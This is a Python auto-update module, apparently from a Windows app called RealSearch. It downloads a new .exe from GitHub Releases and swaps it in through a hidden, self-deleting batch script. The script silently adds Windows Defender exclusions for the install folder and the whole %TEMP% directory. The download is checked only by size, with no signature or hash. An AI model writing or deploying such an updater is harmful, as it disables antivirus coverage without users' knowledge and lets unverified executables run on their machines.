"""Auto-update mechanism - kiểm tra và tải bản mới từ GitHub Releases."""
import os
import shutil
import subprocess
import sys
import tempfile

import httpx

from src.config import get_version, get_app_dir
from src.utils.logger import log

GITHUB_API = "https://api.github.com/repos/TechReal89/RealSearch/releases/latest"

# Thư mục cài đặt cố định
INSTALL_DIR = get_app_dir()
INSTALLED_EXE = INSTALL_DIR / "RealSearch.exe"


def get_current_exe() -> str:
    """Lấy đường dẫn file .exe đang chạy."""
    if getattr(sys, 'frozen', False):
        return sys.executable
    return ""


async def check_for_update() -> dict | None:
    """Kiểm tra bản mới. Trả về info nếu có update."""
    current = get_version().lstrip("v")
    try:
        async with httpx.AsyncClient(timeout=15) as client:
            resp = await client.get(GITHUB_API)
            if resp.status_code != 200:
                return None

            data = resp.json()
            latest = data["tag_name"].lstrip("v")

            if latest > current:
                # Tìm file .exe trong assets
                download_url = None
                file_size = 0
                for asset in data.get("assets", []):
                    if asset["name"].endswith(".exe"):
                        download_url = asset["browser_download_url"]
                        file_size = asset.get("size", 0)
                        break

                if download_url:
                    log.info(f"Phiên bản mới: v{latest} (hiện tại: v{current})")
                    return {
                        "version": latest,
                        "download_url": download_url,
                        "file_size": file_size,
                        "changelog": data.get("body", ""),
                    }
            else:
                log.info(f"Đang dùng phiên bản mới nhất: v{current}")
    except Exception as e:
        log.warning(f"Không thể kiểm tra cập nhật: {e}")

    return None


async def download_and_update(download_url: str, expected_size: int = 0) -> bool:
    """Tải bản mới và thay thế file hiện tại."""
    if not getattr(sys, 'frozen', False):
        log.info("Chế độ dev, bỏ qua auto-update")
        return False

    new_exe = ""
    try:
        current_exe = get_current_exe()
        temp_dir = tempfile.gettempdir()
        new_exe = os.path.join(temp_dir, "RealSearch_new.exe")

        # Xoá file tạm cũ nếu còn
        if os.path.exists(new_exe):
            try:
                os.remove(new_exe)
            except Exception:
                new_exe = os.path.join(temp_dir, "RealSearch_new2.exe")

        log.info("Đang tải bản cập nhật...")
        async with httpx.AsyncClient(timeout=300, follow_redirects=True) as client:
            async with client.stream("GET", download_url) as resp:
                if resp.status_code != 200:
                    log.error(f"Tải thất bại: HTTP {resp.status_code}")
                    return False

                total = int(resp.headers.get("content-length", 0))
                downloaded = 0
                with open(new_exe, "wb") as f:
                    async for chunk in resp.aiter_bytes(chunk_size=65536):
                        f.write(chunk)
                        downloaded += len(chunk)
                        if total > 0:
                            pct = int(downloaded / total * 100)
                            if pct % 20 == 0:
                                log.info(f"Đang tải: {pct}% ({downloaded // 1024 // 1024}MB)")

        # ===== Verify download integrity =====
        actual_size = os.path.getsize(new_exe)

        # Check với expected_size từ GitHub API (nếu có)
        if expected_size > 0 and abs(actual_size - expected_size) > 1024:
            log.error(
                f"File tải về bị lỗi: expected {expected_size} bytes, "
                f"got {actual_size} bytes"
            )
            os.remove(new_exe)
            return False

        # Check với Content-Length (nếu có)
        if total > 0 and actual_size < total:
            log.error(
                f"File tải về không đầy đủ: expected {total} bytes, "
                f"got {actual_size} bytes"
            )
            os.remove(new_exe)
            return False

        # Minimum size check - exe phải ít nhất 10MB
        if actual_size < 10 * 1024 * 1024:
            log.error(f"File tải về quá nhỏ: {actual_size} bytes - có thể bị lỗi")
            os.remove(new_exe)
            return False

        log.info(f"Tải xong ({actual_size // 1024 // 1024}MB), đang cập nhật...")

        # ===== Tạo batch script robust =====
        bat_path = os.path.join(temp_dir, "realsearch_update.bat")
        install_exe = str(INSTALLED_EXE)
        app_name = "RealSearch.exe"

        with open(bat_path, "w", encoding="utf-8") as f:
            f.write(f"""@echo off
chcp 65001 >nul

rem === STEP 1: Kill moi process RealSearch dang chay ===
taskkill /F /IM "{app_name}" >nul 2>&1
timeout /t 2 /nobreak >nul

rem Kill lan 2 de chac chan
taskkill /F /IM "{app_name}" >nul 2>&1
timeout /t 3 /nobreak >nul

rem === STEP 2: Xoa cac thu muc _MEI cu trong Temp ===
for /D %%d in ("%TEMP%\\_MEI*") do (
    rd /S /Q "%%d" >nul 2>&1
)

rem === STEP 3: Copy ban moi ghi de ===
copy /Y "{new_exe}" "{current_exe}" >nul 2>&1
if errorlevel 1 (
    timeout /t 3 /nobreak >nul
    copy /Y "{new_exe}" "{current_exe}" >nul 2>&1
)

rem === STEP 4: Copy vao thu muc cai dat co dinh ===
if not exist "{INSTALL_DIR}" mkdir "{INSTALL_DIR}"
copy /Y "{new_exe}" "{install_exe}" >nul 2>&1
if errorlevel 1 (
    timeout /t 2 /nobreak >nul
    copy /Y "{new_exe}" "{install_exe}" >nul 2>&1
)

rem === STEP 5: Xoa file tam ===
del /F /Q "{new_exe}" >nul 2>&1

rem === STEP 6: Them Windows Defender exclusion (giam false positive) ===
powershell -Command "Add-MpPreference -ExclusionPath '{INSTALL_DIR}'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%'" >nul 2>&1

rem === STEP 7: Khoi dong lai tu thu muc cai dat ===
if exist "{install_exe}" (
    start "" "{install_exe}"
) else (
    start "" "{current_exe}"
)

rem === STEP 8: Xoa bat file ===
del /F /Q "%~f0" >nul 2>&1
""")

        subprocess.Popen(
            ["cmd", "/c", bat_path],
            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0,
        )
        return True

    except Exception as e:
        log.error(f"Cập nhật thất bại: {e}")
        # Xoá file tạm nếu có
        if new_exe:
            try:
                if os.path.exists(new_exe):
                    os.remove(new_exe)
            except Exception:
                pass
        return False
